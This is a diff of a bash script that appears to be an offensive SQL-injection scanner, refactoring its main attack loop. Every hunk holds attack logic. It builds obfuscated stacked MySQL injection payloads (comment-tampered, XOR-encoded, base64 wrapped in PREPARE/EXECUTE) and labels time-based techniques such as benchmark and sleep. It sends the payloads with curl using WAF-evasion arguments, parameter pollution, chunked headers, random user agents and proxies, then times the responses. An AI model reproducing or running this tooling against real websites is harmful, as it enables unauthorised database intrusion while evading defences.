@@ -186,25 +186,12 @@ dork() {
           local t4=$(space2comment_engine "$t2")
           local hex_xor=$(xor_engine "$t4")
           local b64_payload=$(base64_engine "$hex_xor")
-          defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
+          defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"                                        
 
-          if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
-            final_query="${default_path}${defiance_tamper_path}"
-          else
-            if [[ "$defiance_tamper_path" == *"="* ]]; then
-              local param_name
-              local param_val
-              param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
-              param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
-              final_query="${default_path}${param_name}=999&${param_name}=${param_val}${query_payload}"
-            else
-              final_query="${default_path}${defiance_tamper_path}"
-            fi
-          fi
-
-          local waf_trick=$(braindamage)
+          local waf_args=$(braindamage)
           local clean_target_url="${target_url%%\?*}"
           local active_payload=""
+          
           if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
             active_payload="$t4"
           else
@@ -217,40 +204,31 @@ dork() {
           else
             local technique_name="Generic Time-Based"
             case "${raw_payload}" in
-              *"benchmark"*)
-                technique_name="Time-Based (Heavy Benchmark)"
-              ;;
-              *"randomblob"*)
-                technique_name="Time-Based (CPU-Exhaustion Blob)"
-              ;;
-              *"extractvalue"*|*"updatesxml"*)
-                technique_name="Time-Based (XML Function Nested)"
-              ;;
-              *"json_keys"*)
-                technique_name="Time-Based (JSON Object Nested)"
-              ;;
-              *"sleep"*)
-                technique_name="Time-Based (Sub-Query Sleep)"
-              ;;
+              *"benchmark"*) technique_name="Time-Based (Heavy Benchmark)" ;;
+              *"randomblob"*) technique_name="Time-Based (CPU-Exhaustion Blob)" ;;
+              *"extractvalue"*|*"updatesxml"*) technique_name="Time-Based (XML Function Nested)" ;;
+              *"json_keys"*) technique_name="Time-Based (JSON Object Nested)" ;;
+              *"sleep"*) technique_name="Time-Based (Sub-Query Sleep)" ;;
             esac
             output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
           fi
           echo -e "$output_text"
+
           if [ "$REQ_METHOD" = "POST" ]; then
             curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
-              curl $proxy_flag $cookie_flag "${waf_trick[@]}" $rapid_reset_args "${chunked_headers[@]}" \
+              curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
               --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
               -m 12 -A "$random_ua" -s -o /dev/null -d @- \
               -w "%{time_total}|%{http_code}" \
               "${target_url}${default_path}")
           else
-            curl_output=$(curl $proxy_flag $cookie_flag "${waf_trick[@]}" $rapid_reset_args "${chunked_headers[@]}" \
+            curl_output=$(curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
               --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
               -m 12 -A "$random_ua" -s -o /dev/null \
               -w "%{time_total}|%{http_code}" \
               "${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}")
-          fi
-
+          fi  
+                        
           local stopwatch
           local http_status
           stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
@@ -328,46 +306,34 @@ dork() {
             local t4=$(space2comment_engine "$t2")
             local hex_xor=$(xor_engine "$t4")
             local b64_payload=$(base64_engine "$hex_xor")
-            defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
+            defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"            
 
-            if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
-              final_query="${default_path}${defiance_tamper_path}"
-            else
-              if [[ "$defiance_tamper_path" == *"="* ]]; then
-                local param_name
-                local param_val
-                param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
-                param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
-                final_query="${default_path}${param_name}=999&${param_name}=${param_val}${query_payload}"
-              else
-                final_query="${default_path}${defiance_tamper_path}"
-              fi
-            fi
+          local waf_args=$(braindamage)
+          local clean_target_url="${target_url%%\?*}"
+          local active_payload=""
+          
+          if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
+            active_payload="$t4"
+          else
+            active_payload="$defiance_tamper_path"
+          fi
+          local current_method="${REQ_METHOD:-POST}"                    
 
-            local waf_trick=$(braindamage)
-            local clean_target_url="${target_url%%\?*}"
-            local active_payload=""
-            if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
-              active_payload="$t4"
-            else
-              active_payload="$defiance_tamper_path"
-            fi
-            local current_method="${REQ_METHOD:-POST}"           
-               
-            if [ "$REQ_METHOD" = "POST" ]; then
-              curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
-                curl $proxy_flag $cookie_flag "${waf_trick[@]}" $rapid_reset_args "${chunked_headers[@]}" \
-                --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
-                -m 12 -A "$random_ua" -s -o /dev/null -d @- \
-                -w "%{time_total}|%{http_code}" \
-                "${target_url}${default_path}")
-            else
-              curl_output=$(curl $proxy_flag $cookie_flag "${waf_trick[@]}" $rapid_reset_args "${chunked_headers[@]}" \
-                --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
-                -m 12 -A "$random_ua" -s -o /dev/null \
-                -w "%{time_total}|%{http_code}" \
-                "${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}")
-            fi
+          if [ "$REQ_METHOD" = "POST" ]; then
+            curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
+              curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
+              --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
+              -m 12 -A "$random_ua" -s -o /dev/null -d @- \
+              -w "%{time_total}|%{http_code}" \
+              "${target_url}${default_path}")
+          else
+            curl_output=$(curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
+              --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
+              -m 12 -A "$random_ua" -s -o /dev/null \
+              -w "%{time_total}|%{http_code}" \
+              "${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}")
+          fi                      
+                
             local stopwatch
             local http_status
             stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
